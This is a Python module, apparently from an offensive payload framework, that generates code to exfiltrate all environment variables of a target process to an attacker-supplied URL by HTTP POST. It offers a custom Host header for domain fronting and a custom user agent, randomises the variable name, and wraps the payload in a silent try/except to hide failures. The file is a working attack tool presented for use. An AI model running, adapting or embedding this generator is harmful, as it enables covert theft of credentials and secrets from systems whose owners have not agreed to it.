from payloads.modules.python.common import urllib_callback
from payloads.helpers.string import random_string


class Module:

    def __init__(self, params=[]):

        self.info = {
            'Author': 'Alain Homewood',
            'Description': 'Exfiltrates environment variables to a URL in a POST request',
        }

        self.options = {
            'Exfiltration URL': {
                'Description': 'The URL to exfiltrate data to',
                'Required': True,
                'Type': 'url',
                'Value': ''
            },
            'Host Header': {
                'Description': '(Optional) Specify a custom Host header (i.e. for domain fronting)',
                'Required': False,
                'Type': 'text',
                'Value': ''
            },
            'User Agent': {
                'Description': '(Optional) Specify a custom user agent',
                'Required': False,
                'Type': 'text',
                'Value': ''
            },
        }

        for param in params:
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value

    def generate(self):
        var_post_data = random_string(10, 20)

        code = "import os;from urllib import parse;"
        code += "{0}=parse.urlencode(os.environ).encode();".format(var_post_data)

        code += urllib_callback(url=self.options['Exfiltration URL']['Value'],
                                host_header=self.options['Host Header']['Value'],
                                user_agent=self.options['User Agent']['Value'],
                                post_data_variable=var_post_data,
                                try_except_wrap=False)
        code = "try:\n    {0}\nexcept:\n    pass\n".format(code)

        return code
